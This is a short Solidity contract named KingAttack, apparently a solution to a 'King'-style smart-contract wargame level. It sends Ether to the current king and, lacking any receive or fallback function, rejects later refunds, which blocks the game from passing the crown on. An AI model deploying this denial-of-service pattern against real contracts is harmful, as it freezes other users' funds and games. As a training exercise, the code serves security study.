// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract KingAttack {
    function getKing(address king) public payable {
        payable(king).transfer(msg.value);
    }
}